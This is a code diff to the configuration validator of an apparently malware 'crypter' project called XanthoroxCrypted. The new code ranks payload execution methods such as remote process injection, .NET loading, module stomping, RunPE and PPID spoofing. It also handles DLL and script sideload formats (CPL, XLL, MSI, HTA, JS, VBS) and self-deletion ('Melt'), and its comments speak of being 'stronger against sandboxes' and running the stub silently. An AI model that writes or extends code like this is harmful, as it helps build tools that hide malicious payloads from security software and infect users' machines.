@@ -35,15 +35,35 @@ namespace XanthoroxCrypted.Core
             // ═══ 1. EXECUTION METHOD CONFLICTS ═══
             // Only one execution method should be active. Entry.cpp uses if/else-if,
             // so multiple won't crash — but only the highest-priority one runs.
-            // Priority: PhantomDLL > ThreadPool > ModuleStomp > RunPE > CallbackDiv > Fibers > default
-            int execCount = CountTrue(config.PhantomDLL, config.ThreadPool,
+            // Priority: RemoteInjection > DotNetLoading > PhantomDLL > ThreadPool > ModuleStomp > RunPE > CallbackDiv > Fibers > default
+            int execCount = CountTrue(config.RemoteInjection, config.DotNetLoading,
+                config.PhantomDLL, config.ThreadPool,
                 config.ModuleStomp, config.RunPE, config.CallbackDiv);
             // Fibers is default fallback, so don't count it as conflict
 
             if (execCount > 1)
             {
                 // Auto-resolve: keep highest priority, disable rest
-                if (config.PhantomDLL)
+                if (config.RemoteInjection)
+                {
+                    config.DotNetLoading = false;
+                    config.PhantomDLL = false;
+                    config.ThreadPool = false;
+                    config.ModuleStomp = false;
+                    config.RunPE = false;
+                    config.CallbackDiv = false;
+                    config.Fibers = false;
+                }
+                else if (config.DotNetLoading)
+                {
+                    config.PhantomDLL = false;
+                    config.ThreadPool = false;
+                    config.ModuleStomp = false;
+                    config.RunPE = false;
+                    config.CallbackDiv = false;
+                    config.Fibers = false;
+                }
+                else if (config.PhantomDLL)
                 {
                     config.ThreadPool = false;
                     config.ModuleStomp = false;
@@ -108,7 +128,7 @@ namespace XanthoroxCrypted.Core
 
             // ═══ 6. SLEEP OBF + STAGED LOAD ═══
             // Both add delays. Combined they could make startup slow (~10-15 sec).
-            if (config.SleepObf && config.StagedLoad)
+            if (config.EkkoSleep && config.StagedLoad)
             {
                 result.Warnings.Add("Sleep Obfuscation + Staged Load both active — startup delay will be ~10-15 seconds. " +
                     "This is stronger against sandboxes but slower for the end user.");
@@ -129,6 +149,33 @@ namespace XanthoroxCrypted.Core
             // PhantomDLL creates a new process context (signed DLL). PPIDSpoof also
             // modifies the parent. Both are compatible — PPID applies to the crypter
             // process, PhantomDLL executes the payload in DLL memory.
+
+            // ═══ 11. SIDELOAD FORMAT CONFLICTS ═══
+            // CPL/XLL/MSI are DLL formats — RunPE creates a new process, so it works
+            // from a DLL. But Fibers/CallbackProxy/ModuleStomp are in-process shellcode
+            // execution — they work differently inside a DLL host process.
+            if (config.SideloadFormat && config.SideloadFormatType >= 1 && config.SideloadFormatType <= 3)
+            {
+                // DLL sideload: Melt doesn't make sense (can't delete the DLL while loaded)
+                if (config.Melt)
+                {
+                    config.Melt = false;
+                    result.AutoFixed = true;
+                    result.Warnings.Add("Sideload DLL + Melt conflict — disabled Melt (can't delete a loaded DLL).");
+                }
+            }
+
+            // ═══ 12. SIDELOAD SCRIPT FORMATS ═══
+            // HTA/JS/VBS launch the EXE stub — they work with any execution method.
+            // The script wrapper just executes the stub silently.
+
+            // ═══ 13. INJECTION METHOD RANGE ═══
+            if (config.RemoteInjection && config.InjectionMethod > 4)
+            {
+                config.InjectionMethod = 0;
+                result.AutoFixed = true;
+                result.Warnings.Add("InjectionMethod out of range — reset to Section Mapping (0).");
+            }
 
             return result;
         }
